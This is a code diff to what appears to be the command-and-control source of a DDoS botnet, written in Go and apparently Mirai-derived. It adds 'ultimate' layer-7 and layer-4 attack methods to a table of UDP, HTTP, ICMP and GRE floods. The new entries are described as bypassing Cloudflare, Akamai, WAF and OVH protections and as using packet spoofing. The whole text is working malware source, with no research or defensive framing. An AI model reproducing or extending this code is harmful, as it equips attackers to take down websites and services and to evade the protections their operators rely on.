@@ -52,7 +52,7 @@ var flagInfoLookup map[string]FlagInfo = map[string]FlagInfo{
 }
 
 /*
- * Attack method IDs - 10 optimized methods
+ * Attack method IDs - 11 optimized methods (including ULTIMATE)
  * Must match bot/attack.h ATK_VEC_* values
  */
 var attackInfoLookup map[string]AttackInfo = map[string]AttackInfo{
@@ -61,15 +61,17 @@ var attackInfoLookup map[string]AttackInfo = map[string]AttackInfo{
 	"udp":      AttackInfo{1, []uint8{0, 1, 6, 7, 25}, "UDP flood optimized for Gbps"},
 	"http":     AttackInfo{2, []uint8{7, 8, 20, 22, 24, 30}, "HTTP flood optimized for RPS"},
 	"axis-l7":  AttackInfo{3, []uint8{7, 8, 16, 17, 18, 24, 30, 31}, "Browser emulation + HTTPS + CF bypass"},
-	
+	"ultimate-l7": AttackInfo{10, []uint8{7, 8, 16, 17, 18, 24, 30, 31}, "ULTIMATE L7 - Advanced multi-layer bypass (CF, Akamai, WAF)"},
+	"ultimate-l4": AttackInfo{11, []uint8{0, 1, 6, 7, 25}, "ULTIMATE L4 - Combined TCP+UDP+ICMP+GRE with spoofing"},
+
 	/* OVH Bypass */
 	"ovhtcp":   AttackInfo{4, []uint8{0, 1, 6, 7, 25}, "TCP with OVH Game bypass"},
 	"ovhudp":   AttackInfo{5, []uint8{0, 1, 6, 7, 25}, "UDP with OVH Game bypass"},
-	
+
 	/* ICMP & Combined */
 	"icmp":     AttackInfo{6, []uint8{0, 25}, "ICMP ping flood (no port needed)"},
 	"axis-l4":  AttackInfo{7, []uint8{0, 1, 6, 7, 25}, "Combined OVHTCP + OVHUDP + ICMP"},
-	
+
 	/* GRE Attacks */
 	"greip":    AttackInfo{8, []uint8{0, 1, 6, 7, 25}, "GRE IP flood"},
 	"greeth":   AttackInfo{9, []uint8{0, 1, 6, 7, 25}, "GRE Ethernet flood"},
@@ -103,7 +105,7 @@ func NewAttack(str string, admin int) (*Attack, error) {
 	}
 
 	// Check if this is an HTTP/HTTPS attack
-	isHTTPAttack := atk.Type == 2 || atk.Type == 3
+	isHTTPAttack := atk.Type == 2 || atk.Type == 3 || atk.Type == 10
 
 	if isHTTPAttack {
 		targetURL := args[1]
